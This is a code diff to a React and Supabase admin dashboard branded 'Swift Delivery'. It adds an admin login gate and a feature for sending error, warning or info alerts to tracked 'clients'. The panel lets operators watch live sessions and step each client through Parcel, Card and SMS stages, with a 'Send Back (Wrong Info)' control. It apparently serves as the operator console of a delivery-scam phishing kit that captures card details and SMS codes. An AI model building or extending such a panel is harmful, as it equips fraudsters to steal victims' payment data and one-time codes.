@@ -3,6 +3,7 @@ import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
+import { Input } from "@/components/ui/input";
 import { 
   RefreshCw, 
   CreditCard, 
@@ -10,10 +11,23 @@ import {
   Package,
   ArrowLeft,
   Users,
-  Clock
+  Clock,
+  Send,
+  AlertTriangle,
+  Info,
+  XCircle,
+  LogOut
 } from "lucide-react";
 import { toast } from "@/hooks/use-toast";
 import swiftDeliveryLogo from "@/assets/swift-delivery-logo.png";
+import AdminLogin from "@/components/AdminLogin";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
 
 interface ClientSession {
   id: string;
@@ -24,6 +38,8 @@ interface ClientSession {
   parcel_tracking: string | null;
   amount: number | null;
   status: string | null;
+  admin_message: string | null;
+  message_type: string | null;
   created_at: string;
   updated_at: string;
 }
@@ -40,9 +56,35 @@ const stepColors: Record<number, string> = {
   3: "bg-green-500"
 };
 
+const messageTypes = [
+  { value: "error", label: "Error", icon: XCircle, color: "text-red-500" },
+  { value: "warning", label: "Warning", icon: AlertTriangle, color: "text-yellow-500" },
+  { value: "info", label: "Info", icon: Info, color: "text-blue-500" },
+];
+
 const AdminPanel = () => {
+  const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [sessions, setSessions] = useState<ClientSession[]>([]);
   const [loading, setLoading] = useState(true);
+  const [messageInputs, setMessageInputs] = useState<Record<string, { message: string; type: string }>>({});
+
+  // Check for existing admin session
+  useEffect(() => {
+    const adminAuth = sessionStorage.getItem("admin_authenticated");
+    if (adminAuth === "true") {
+      setIsAuthenticated(true);
+    }
+  }, []);
+
+  const handleLogout = () => {
+    sessionStorage.removeItem("admin_authenticated");
+    sessionStorage.removeItem("admin_username");
+    setIsAuthenticated(false);
+    toast({
+      title: "Logged out",
+      description: "You have been logged out of the admin panel",
+    });
+  };
 
   const fetchSessions = async () => {
     const { data, error } = await supabase
@@ -64,7 +106,7 @@ const AdminPanel = () => {
     setLoading(false);
   };
 
-  const updateClientStep = async (sessionId: string, newStep: number, action: string) => {
+  const updateClientStep = async (sessionId: string, newStep: number) => {
     const { error } = await supabase
       .from("client_sessions")
       .update({ current_step: newStep })
@@ -80,34 +122,90 @@ const AdminPanel = () => {
     } else {
       toast({
         title: "Success",
-        description: `Client sent back to ${stepNames[newStep]}`,
+        description: `Client sent to ${stepNames[newStep]}`,
+      });
+    }
+  };
+
+  const sendMessage = async (sessionId: string) => {
+    const input = messageInputs[sessionId];
+    if (!input?.message || !input?.type) {
+      toast({
+        title: "Error",
+        description: "Please enter a message and select a type",
+        variant: "destructive"
+      });
+      return;
+    }
+
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ 
+        admin_message: input.message,
+        message_type: input.type
+      })
+      .eq("id", sessionId);
+
+    if (error) {
+      console.error("Error sending message:", error);
+      toast({
+        title: "Error",
+        description: "Failed to send message",
+        variant: "destructive"
+      });
+    } else {
+      toast({
+        title: "Message Sent",
+        description: "Alert sent to client",
+      });
+      setMessageInputs(prev => ({
+        ...prev,
+        [sessionId]: { message: "", type: "error" }
+      }));
+    }
+  };
+
+  const clearMessage = async (sessionId: string) => {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({ admin_message: null, message_type: null })
+      .eq("id", sessionId);
+
+    if (error) {
+      console.error("Error clearing message:", error);
+    } else {
+      toast({
+        title: "Message Cleared",
+        description: "Alert removed from client view",
       });
     }
   };
 
   useEffect(() => {
-    fetchSessions();
+    if (isAuthenticated) {
+      fetchSessions();
 
-    // Subscribe to realtime changes
-    const channel = supabase
-      .channel("client_sessions_changes")
-      .on(
-        "postgres_changes",
-        {
-          event: "*",
-          schema: "public",
-          table: "client_sessions"
-        },
-        () => {
-          fetchSessions();
-        }
-      )
-      .subscribe();
+      // Subscribe to realtime changes
+      const channel = supabase
+        .channel("client_sessions_changes")
+        .on(
+          "postgres_changes",
+          {
+            event: "*",
+            schema: "public",
+            table: "client_sessions"
+          },
+          () => {
+            fetchSessions();
+          }
+        )
+        .subscribe();
 
-    return () => {
-      supabase.removeChannel(channel);
-    };
-  }, []);
+      return () => {
+        supabase.removeChannel(channel);
+      };
+    }
+  }, [isAuthenticated]);
 
   const getTimeSince = (dateString: string) => {
     const date = new Date(dateString);
@@ -121,6 +219,10 @@ const AdminPanel = () => {
     if (diffHours < 24) return `${diffHours}h ago`;
     return `${Math.floor(diffHours / 24)}d ago`;
   };
+
+  if (!isAuthenticated) {
+    return <AdminLogin onLogin={() => setIsAuthenticated(true)} />;
+  }
 
   return (
     <div className="min-h-screen bg-background">
@@ -152,6 +254,15 @@ const AdminPanel = () => {
               >
                 <RefreshCw className="w-4 h-4" />
                 Refresh
+              </Button>
+              <Button 
+                variant="ghost" 
+                size="sm" 
+                onClick={handleLogout}
+                className="gap-2"
+              >
+                <LogOut className="w-4 h-4" />
+                Logout
               </Button>
             </div>
           </div>
@@ -224,6 +335,72 @@ const AdminPanel = () => {
                     </div>
                   </div>
 
+                  {/* Current Message Status */}
+                  {session.admin_message && (
+                    <div className="p-2 rounded bg-muted border">
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-2 text-sm">
+                          {session.message_type === "error" && <XCircle className="w-4 h-4 text-red-500" />}
+                          {session.message_type === "warning" && <AlertTriangle className="w-4 h-4 text-yellow-500" />}
+                          {session.message_type === "info" && <Info className="w-4 h-4 text-blue-500" />}
+                          <span className="truncate max-w-[150px]">{session.admin_message}</span>
+                        </div>
+                        <Button 
+                          variant="ghost" 
+                          size="sm"
+                          onClick={() => clearMessage(session.id)}
+                        >
+                          <XCircle className="w-4 h-4" />
+                        </Button>
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Send Message */}
+                  <div className="space-y-2 pt-2 border-t">
+                    <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
+                      Send Alert to Client:
+                    </p>
+                    <div className="flex gap-2">
+                      <Select
+                        value={messageInputs[session.id]?.type || "error"}
+                        onValueChange={(value) => setMessageInputs(prev => ({
+                          ...prev,
+                          [session.id]: { ...prev[session.id], type: value, message: prev[session.id]?.message || "" }
+                        }))}
+                      >
+                        <SelectTrigger className="w-[100px]">
+                          <SelectValue />
+                        </SelectTrigger>
+                        <SelectContent>
+                          {messageTypes.map((type) => (
+                            <SelectItem key={type.value} value={type.value}>
+                              <div className="flex items-center gap-2">
+                                <type.icon className={`w-4 h-4 ${type.color}`} />
+                                {type.label}
+                              </div>
+                            </SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                      <Input
+                        placeholder="Enter message..."
+                        value={messageInputs[session.id]?.message || ""}
+                        onChange={(e) => setMessageInputs(prev => ({
+                          ...prev,
+                          [session.id]: { ...prev[session.id], message: e.target.value, type: prev[session.id]?.type || "error" }
+                        }))}
+                        className="flex-1"
+                      />
+                      <Button 
+                        size="icon"
+                        onClick={() => sendMessage(session.id)}
+                      >
+                        <Send className="w-4 h-4" />
+                      </Button>
+                    </div>
+                  </div>
+
                   {/* Control Buttons */}
                   <div className="space-y-2 pt-2 border-t">
                     <p className="text-xs text-muted-foreground font-medium uppercase tracking-wide">
@@ -234,7 +411,7 @@ const AdminPanel = () => {
                         variant={session.current_step === 1 ? "default" : "outline"}
                         size="sm"
                         className="flex-col h-auto py-2 gap-1"
-                        onClick={() => updateClientStep(session.id, 1, "parcel")}
+                        onClick={() => updateClientStep(session.id, 1)}
                         disabled={session.current_step === 1}
                       >
                         <Package className="w-4 h-4" />
@@ -244,7 +421,7 @@ const AdminPanel = () => {
                         variant={session.current_step === 2 ? "default" : "outline"}
                         size="sm"
                         className="flex-col h-auto py-2 gap-1"
-                        onClick={() => updateClientStep(session.id, 2, "card")}
+                        onClick={() => updateClientStep(session.id, 2)}
                         disabled={session.current_step === 2}
                       >
                         <CreditCard className="w-4 h-4" />
@@ -254,7 +431,7 @@ const AdminPanel = () => {
                         variant={session.current_step === 3 ? "default" : "outline"}
                         size="sm"
                         className="flex-col h-auto py-2 gap-1"
-                        onClick={() => updateClientStep(session.id, 3, "sms")}
+                        onClick={() => updateClientStep(session.id, 3)}
                         disabled={session.current_step === 3}
                       >
                         <MessageSquare className="w-4 h-4" />
@@ -269,7 +446,7 @@ const AdminPanel = () => {
                       variant="destructive"
                       size="sm"
                       className="w-full gap-2"
-                      onClick={() => updateClientStep(session.id, session.current_step - 1, "back")}
+                      onClick={() => updateClientStep(session.id, session.current_step - 1)}
                     >
                       <ArrowLeft className="w-4 h-4" />
                       Send Back (Wrong Info)
